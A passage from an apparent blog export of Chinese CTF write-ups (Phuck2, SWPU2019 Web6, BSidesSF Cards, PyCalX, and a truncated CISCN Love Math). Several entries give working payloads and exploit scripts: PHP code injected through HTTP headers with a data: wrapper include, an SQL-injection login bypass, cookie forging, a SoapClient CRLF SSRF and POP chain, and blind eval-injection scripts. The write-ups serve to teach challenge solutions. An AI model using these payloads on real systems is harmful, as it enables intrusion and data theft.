      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>Phuck2</title>
    <url>/2020/04/17/CTF_WP/Phuck2/</url>
    <content><![CDATA[<h1 id="Phuck2"><a href="#Phuck2" class="headerlink" title="Phuck2"></a>Phuck2</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查看wp的源代码的发现传入参数hl可以得到源码</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    stream_wrapper_unregister(&#39;php&#39;);</span><br><span class="line">    if(isset($_GET[&#39;hl&#39;])) highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">    $mkdir &#x3D; function($dir) &#123;</span><br><span class="line">        system(&#39;mkdir -- &#39;.escapeshellarg($dir));</span><br><span class="line">    &#125;;</span><br><span class="line">    $randFolder &#x3D; bin2hex(random_bytes(16));</span><br><span class="line">    $mkdir(&#39;users&#x2F;&#39;.$randFolder);</span><br><span class="line">    chdir(&#39;users&#x2F;&#39;.$randFolder);</span><br><span class="line"></span><br><span class="line">    $userFolder &#x3D; (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]) ? $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] : $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    $userFolder &#x3D; basename(str_replace([&#39;.&#39;,&#39;-&#39;],[&#39;&#39;,&#39;&#39;],$userFolder));</span><br><span class="line"></span><br><span class="line">    $mkdir($userFolder);</span><br><span class="line">    chdir($userFolder);</span><br><span class="line">    file_put_contents(&#39;profile&#39;,print_r($_SERVER,true));</span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">    $_GET[&#39;page&#39;]&#x3D;str_replace(&#39;.&#39;,&#39;&#39;,$_GET[&#39;page&#39;]);</span><br><span class="line">    if(!stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;php&#39;)) &#123;</span><br><span class="line">        include($_GET[&#39;page&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chdir(__DIR__);</span><br><span class="line">    system(&#39;rm -rf users&#x2F;&#39;.$randFolder);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>$userFolder</code>在有<code>X-FORWARDED-FOR</code>头是用这个作为文件夹名</p>
<p>会打印<code>$_SERVER</code>传入profile文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(!stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($_GET[&#39;page&#39;]),&#39;php&#39;)) &#123;</span><br><span class="line">        include($_GET[&#39;page&#39;]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>考虑在http请求头中插入php代码,然后包含profile文件进行命令执行</p>
<p>当<code>allow_url_include=Off</code>时</p>
<p>file_get_contents在处理data:xxx时会直接取xxx</p>
<p>而include会包含文件名为data:xxx的文件</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;?page&#x3D;data:aa&#x2F;profile HTTP&#x2F;1.1</span><br><span class="line">X-Forwarded-For: data:aa</span><br><span class="line">User-Agent: &lt;?php system(&#39;ls &#x2F;&#39;); ?&gt;</span><br><span class="line">GET &#x2F;?page&#x3D;data:aa&#x2F;profile HTTP&#x2F;1.1</span><br><span class="line">X-Forwarded-For: data:aa</span><br><span class="line">User-Agent: &lt;?php system(&#39;&#x2F;get_flag&#39;);?&gt;</span><br></pre></td></tr></table></figure>
<p>在返回的数据中找到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[HTTP_USER_AGENT] &#x3D;&gt; flag&#123;asdsafasfdsadasd&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ctftime.org/writeup/12921">Phuck2wp</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>php伪协议</tag>
        <tag>data协议与file_get_contents与include</tag>
      </tags>
  </entry>
  <entry>
    <title>[SWPU2019]Web6</title>
    <url>/2020/04/18/CTF_WP/SWPU2019Web6/</url>
    <content><![CDATA[<h1 id="SWPU2019-Web6"><a href="#SWPU2019-Web6" class="headerlink" title="[SWPU2019]Web6"></a>[SWPU2019]Web6</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>验证机制是用户名和密码分开单独验证，并且没有检查空密码</p>
<a id="more"></a>

<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;1&#39; or &#39;1&#39;&#x3D;&#39;1&#39; group by passwd with rollup having passwd is NULL#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
<p>查出来一个用户并且密码为空，正好可以和<code>passwd</code>没有传值是<code>NULL</code>相匹配</p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>写脚本注入，参考</p>
<p><a href="https://lihuaiqiu.github.io/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/">SWPU2019-Web题解</a></p>
<h2 id="伪造admin"><a href="#伪造admin" class="headerlink" title="伪造admin"></a>伪造admin</h2><p>登陆上后查看cookie，然后查看wsdl.php</p>
<p>调用<code>get_flag</code>提示</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200418/fdGAYirSXJ7M.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200418/fdGAYirSXJ7M.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200418/XJgGyei1gNVM.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200418/XJgGyei1gNVM.png?imageslim" alt="mark"></a></p>
<p>找到读取文件的方法，还有一个hint，于是依次读取index.php，encode.php，interface.php，se.php keyaaaaaaaasdfsaf.txt</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200418/qgqd9WsM8elM.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200418/qgqd9WsM8elM.png?imageslim" alt="mark"></a></p>
<p>（不知为何Chrome的HackbarPOST不管用）</p>
<p>encode.php是对cookies的加密，<code>user=</code>后面的字符串为加密后的内容</p>
<p>写出解密脚本，然后伪造成admin，key为txt中的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function decrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">	$key &#x3D; md5($key);</span><br><span class="line">	$x &#x3D; 0;</span><br><span class="line">	$data &#x3D; base64_decode($data);</span><br><span class="line">	$len &#x3D; strlen($data);</span><br><span class="line">	$l &#x3D; strlen($key);</span><br><span class="line">	$char &#x3D; &#39;&#39;;</span><br><span class="line">	for ($i &#x3D; 0; $i &lt; $len; $i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if ($x &#x3D;&#x3D; $l)</span><br><span class="line">		&#123;</span><br><span class="line">			$x &#x3D; 0;</span><br><span class="line">		&#125;</span><br><span class="line">		$char .&#x3D; substr($key, $x, 1);</span><br><span class="line">		$x++;</span><br><span class="line">	&#125;</span><br><span class="line">	$str &#x3D; &#39;&#39;;</span><br><span class="line">	for ($i &#x3D; 0; $i &lt; $len; $i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1)))</span><br><span class="line">		&#123;</span><br><span class="line">			$str .&#x3D; chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			$str .&#x3D; chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return $str;</span><br><span class="line">&#125;</span><br><span class="line">function en_crypt($content,$key)&#123;</span><br><span class="line">	$key    &#x3D;    md5($key);</span><br><span class="line">	$h      &#x3D;    0;</span><br><span class="line">	$length    &#x3D;    strlen($content);</span><br><span class="line">	$swpuctf      &#x3D;    strlen($key);</span><br><span class="line">	$varch   &#x3D;    &#39;&#39;;</span><br><span class="line">	for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">	&#123;</span><br><span class="line">		if ($h &#x3D;&#x3D; $swpuctf)</span><br><span class="line">		&#123;</span><br><span class="line">			$h &#x3D; 0;</span><br><span class="line">		&#125;</span><br><span class="line">		$varch .&#x3D; $key&#123;$h&#125;;</span><br><span class="line"></span><br><span class="line">		$h++;</span><br><span class="line">	&#125;</span><br><span class="line">	$swpu  &#x3D;  &#39;&#39;;</span><br><span class="line"></span><br><span class="line">	for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">	&#123;</span><br><span class="line">		$swpu .&#x3D; chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256);</span><br><span class="line">	&#125;</span><br><span class="line">	return base64_encode($swpu);</span><br><span class="line">&#125;</span><br><span class="line">$key&#x3D;&quot;flag&#123;this_is_false_flag&#125;&quot;;</span><br><span class="line">$data&#x3D;&quot;3J6Roahxag&#x3D;&#x3D;&quot;;</span><br><span class="line">echo decrypt($data,$key);</span><br><span class="line">$admin&#x3D;&quot;admin:1&quot;;</span><br><span class="line">echo en_crypt($admin,$key);</span><br></pre></td></tr></table></figure>
<p>改cookie后变成welcome admin，成功伪造成admin</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>因为要127.0.0.1,很容易联想到SSRF</p>
<p>在se.php中存在关键代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br></pre></td></tr></table></figure>
<p>于是想到session反序列化,又要ssrf,想到利用Soap进行SSRF</p>
<blockquote>
<p>getflag方法总的来说就是构造文件上传写入session文件，然后利用session 反序列化，生成一个soapclient 对象,然后加上crlf设置cookie,进行越权 ssrf</p>
</blockquote>
<h3 id="上传SESSION"><a href="#上传SESSION" class="headerlink" title="上传SESSION"></a>上传SESSION</h3><p>Soap反序列化写入SESSION</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;interface.php&#39;;</span><br><span class="line">$post_string &#x3D; &#39;a&#x3D;1&amp;b&#x3D;2&#39;;</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">	&#39;X-Forwarded-For: 127.0.0.1&#39;,</span><br><span class="line">	&#39;Cookie: user&#x3D;xZmdm9NxaQ&#x3D;&#x3D;&#39;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">);</span><br><span class="line">$b &#x3D; new SoapClient(null, array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39; . join(&#39;^^&#39;, $headers), &#39;uri&#39; &#x3D;&gt; &quot;aaab&quot;));</span><br><span class="line">$aaa &#x3D; serialize($b);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;^^&#39;, &quot;\r\n&quot;, $aaa);</span><br><span class="line">$aaa &#x3D; str_replace(&#39;&amp;&#39;, &#39;&amp;&#39;, $aaa);</span><br><span class="line">echo $aaa;</span><br><span class="line">&#x2F;&#x2F;结果</span><br><span class="line">O:10:&quot;SoapClient&quot;:5:&#123;s:3:&quot;uri&quot;;s:4:&quot;aaab&quot;;s:8:&quot;location&quot;;s:30:&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;interface.php&quot;;s:15:&quot;_stream_context&quot;;i:0;s:11:&quot;_user_agent&quot;;s:109:&quot;wupco</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Cookie: user&#x3D;xZmdm9NxaQ&#x3D;&#x3D;&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
<p>本地写一个html页面用于上传文件,利用<code>session.upload_progress</code>写入session</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;905705f8-b6ff-431a-b953-c2c5ff0d70ed.node3.buuoj.cn&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;1&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>抓包修改</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200418/oi8rEAsNnlTP.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200418/oi8rEAsNnlTP.png?imageslim" alt="mark"></a></p>
<h3 id="触发SESSION反序列化"><a href="#触发SESSION反序列化" class="headerlink" title="触发SESSION反序列化"></a>触发SESSION反序列化</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class aa &#123;</span><br><span class="line">	public $mod1;</span><br><span class="line">	public $mod2;</span><br><span class="line"></span><br><span class="line">	public function __call ($name, $param) &#123;</span><br><span class="line">		if ($this-&gt;&#123;$name&#125;) &#123;</span><br><span class="line">			$s1 &#x3D; $this-&gt;&#123;$name&#125;;</span><br><span class="line">			$s1();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function __get ($ke) &#123;</span><br><span class="line">		return $this-&gt;mod2[$ke];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class bb &#123;</span><br><span class="line">	public $mod1;</span><br><span class="line">	public $mod2;</span><br><span class="line"></span><br><span class="line">	public function __destruct () &#123;</span><br><span class="line">		$this-&gt;mod1-&gt;test2();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cc &#123;</span><br><span class="line">	public $mod1;</span><br><span class="line">	public $mod2;</span><br><span class="line">	public $mod3;</span><br><span class="line"></span><br><span class="line">	public function __invoke () &#123;</span><br><span class="line">		$this-&gt;mod2 &#x3D; $this-&gt;mod3 . $this-&gt;mod1;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dd &#123;</span><br><span class="line">	public $name;</span><br><span class="line">	public $flag;</span><br><span class="line">	public $b;</span><br><span class="line"></span><br><span class="line">	public function getflag () &#123;</span><br><span class="line">		session_start();</span><br><span class="line">		var_dump($_SESSION);</span><br><span class="line">		$a &#x3D; array(reset($_SESSION), $this-&gt;flag);</span><br><span class="line">		echo call_user_func($this-&gt;b, $a);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ee &#123;</span><br><span class="line">	public $str1;</span><br><span class="line">	public $str2;</span><br><span class="line"></span><br><span class="line">	public function __toString () &#123;</span><br><span class="line">		$this-&gt;str1-&gt;&#123;$this-&gt;str2&#125;();</span><br><span class="line">		return &quot;1&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$first &#x3D; new bb();</span><br><span class="line">$second &#x3D; new aa();</span><br><span class="line">$third &#x3D; new cc();</span><br><span class="line">$four &#x3D; new ee();</span><br><span class="line">$first-&gt;mod1 &#x3D; $second;</span><br><span class="line">$third-&gt;mod1 &#x3D; $four;</span><br><span class="line">$f &#x3D; new dd();</span><br><span class="line">$f-&gt;flag &#x3D; &#39;Get_flag&#39;;</span><br><span class="line">$f-&gt;b &#x3D; &#39;call_user_func&#39;;</span><br><span class="line">$four-&gt;str1 &#x3D; $f;</span><br><span class="line">$four-&gt;str2 &#x3D; &quot;getflag&quot;;</span><br><span class="line">$second-&gt;mod2[&#39;test2&#39;] &#x3D; $third;</span><br><span class="line">&#x2F;&#x2F;var_dump($first);</span><br><span class="line">echo serialize($first);</span><br></pre></td></tr></table></figure>
<p>目的是触发get_flag方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bb-&gt;__destruct()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;aa-&gt;__call()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;cc-&gt;__invoke()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;ee-&gt;__toString()&#96;&#x3D;&#x3D;&#x3D;&gt;&#96;dd-&gt;getflag()</span><br></pre></td></tr></table></figure>
<p>pop链可以用反向分析的方法得到。</p>
<p>触发session反序列化得到Soap对象爬取到的flag,然后输出</p>
<p>发送给se.php即可得到flag</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200418/gMTEYpm95l3I.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200418/gMTEYpm95l3I.png?imageslim" alt="mark"></a></p>
<h2 id="学习一下session-upload-progress"><a href="#学习一下session-upload-progress" class="headerlink" title="学习一下session.upload_progress"></a>学习一下session.upload_progress</h2><p>php&gt;5.4时,php.ini有如下默认配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled &#x3D; on</span><br><span class="line">session.upload_progress.cleanup &#x3D; on</span><br><span class="line">session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>enabled=on</code>表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</li>
<li><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；<ul>
<li><code>cleanup=on</code>时考虑条件竞争进行利用</li>
</ul>
</li>
<li><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</li>
<li><code>prefix+name</code>将表示为session中的键名</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://lihuaiqiu.github.io/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/">SWPU2019-Web题解</a></p>
<p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p>
<p><a href="https://www.anquanke.com/post/id/194640#h3-6">第十届SWPUCTFwriteup</a></p>
<p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral">PHP中SESSION反序列化机制</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>[BSidesSF 2020]Cards</title>
    <url>/2020/04/08/CTF_WP/%5BBSidesSF%202020%5DCards/</url>
    <content><![CDATA[<h1 id="BSidesSF-2020-Cards"><a href="#BSidesSF-2020-Cards" class="headerlink" title="[BSidesSF 2020]Cards"></a>[BSidesSF 2020]Cards</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>21点游戏,查看rules,21点3:2,下注最多500,所以每次最多赢750要赚到100000</p>
<a id="more"></a>

<p>随便试一下,有一个初始化的/api获取初始金钱和secretstate</p>
<p>/api/deal下注</p>
<p>要达到的目的,利用获取新的secretstate,旧的没有失效的达到一直赚钱的效果</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">start &#x3D; &quot;http:&#x2F;&#x2F;bd6d39d5-cd91-4bb9-b2ef-e753aa13f02d.node3.buuoj.cn&#x2F;api&quot;</span><br><span class="line">deal &#x3D; start + &quot;&#x2F;deal&quot;</span><br><span class="line">#开始</span><br><span class="line">state &#x3D; requests.post(start).json()[&quot;SecretState&quot;]</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        #下注</span><br><span class="line">        result &#x3D; requests.post(deal, json&#x3D;&#123;&quot;Bet&quot;: 500, &quot;SecretState&quot;: state&#125;).json()</span><br><span class="line">    except:</span><br><span class="line">        print(result)</span><br><span class="line">        continue</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    if result[&#39;GameState&#39;] &#x3D;&#x3D; &#39;Blackjack&#39;:</span><br><span class="line">        #赢了就换SecretState</span><br><span class="line">        state &#x3D; result[&#39;SecretState&#39;]</span><br><span class="line">        print(result[&#39;Balance&#39;])</span><br><span class="line">    if result[&#39;Balance&#39;] &gt; 100000:</span><br><span class="line">        print(result)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>PyCalX 1和2</title>
    <url>/2020/04/08/CTF_WP/PyCalX%201%E5%92%8C2/</url>
    <content><![CDATA[<h1 id="PyCalX-1和2"><a href="#PyCalX-1和2" class="headerlink" title="PyCalX 1和2"></a>PyCalX 1和2</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先是1,审计源码,souce可控,模拟sql注入改变操作</p>
<a id="more"></a>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;44f679f2-1772-4584-b810-90c98139efc8.node3.buuoj.cn&#x2F;&#39;</span><br><span class="line">flag &#x3D; &#39;flag&#123;&#39;</span><br><span class="line">url &#x3D; url + &quot;cgi-bin&#x2F;pycalx.py&quot;</span><br><span class="line">while True:</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 1</span><br><span class="line">    mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        tmp &#x3D; flag + chr(mid)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &#39;value1&#39;: &#39;a&#39;,</span><br><span class="line">            &#39;op&#39;: &#39;+\&#39;&#39;,</span><br><span class="line">            &#39;value2&#39;: &#39;and FLAG&gt;source#&#39;,</span><br><span class="line">            &#39;source&#39;: tmp</span><br><span class="line">        &#125;</span><br><span class="line">        data2&#x3D;&#123;</span><br><span class="line">            &#39;value1&#39;:&#39;Tru&#39;,</span><br><span class="line">            &#39;op&#39;:&#39;+f&#39;,</span><br><span class="line">            &#39;value2&#39;:&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;,</span><br><span class="line">            &#39;source&#39;:tmp</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.get(url, data)</span><br><span class="line">        print(chr(mid), end&#x3D;&quot;&quot;)</span><br><span class="line">        if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            if &#39;True&#39; in r.text:</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high &#x3D; mid</span><br><span class="line">            mid &#x3D; (high + low) &#x2F;&#x2F; 2</span><br><span class="line">        else:</span><br><span class="line">            time.sleep(1)</span><br><span class="line">    flag +&#x3D; chr(mid-1)</span><br><span class="line">    print(&quot; | flag&#x3D;&quot;+flag)</span><br><span class="line">    if &quot;&#125;&quot; in flag:</span><br><span class="line">        break</span><br><span class="line">print(&quot;flag&#x3D;&quot;+flag)</span><br></pre></td></tr></table></figure>
<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>然后是2,进一步过滤了<code>&#39;&#39;</code>所以利用python3的<code>F-strings</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;value1&#39;:&#39;Tru&#39;,</span><br><span class="line">&#39;op&#39;:&#39;+f&#39;,</span><br><span class="line">&#39;value2&#39;:&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;,</span><br><span class="line">&#39;source&#39;:&#39;flag&#123;a&#39;</span><br></pre></td></tr></table></figure>
<p>利用python3.6以后的特性<code>f&#39;&#123;中间可以加表达式&#125;&#39;</code>,当source为FLAG中字符时输出为Tru+101:c(就是字符e)组合成True,表示结果为false时输出Truf,再print会触发异常然后就会输出Invalid</p>
<p>然后就可以改变表达式来盲注,但是最终并没有复现出来</p>
<p>线上测试都为Invalid</p>
<p>本地测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLAG &#x3D; &quot;flag&#123;test&#125;&quot;</span><br><span class="line">source &#x3D; &quot;fla&quot;</span><br><span class="line">try:</span><br><span class="line">    result &#x3D; str(eval(&#39;Tru&#39;+f&#39;&#123;101 if FLAG&gt;source else 102:c&#125;&#39;))</span><br><span class="line">    if result.isdigit() or result &#x3D;&#x3D; &#39;True&#39; or result &#x3D;&#x3D; &#39;False&#39;:</span><br><span class="line">        print(result)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Invalid&quot;)  # Sorry we don&#39;t support output as a string due to security issue.</span><br><span class="line">        print(1)</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Invalid&quot;)</span><br><span class="line">    print(2)</span><br><span class="line">#输出结果为&#96;True&#96;</span><br><span class="line">#当source&#x3D;&quot;flb&quot;时输出为</span><br><span class="line">#Invalid</span><br><span class="line">#2</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN 2019 初赛]Love Math</title>
    <url>/2020/03/16/CTF_WP/%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math/</url>
    <content><![CDATA[<h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><a id="more"></a>

<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    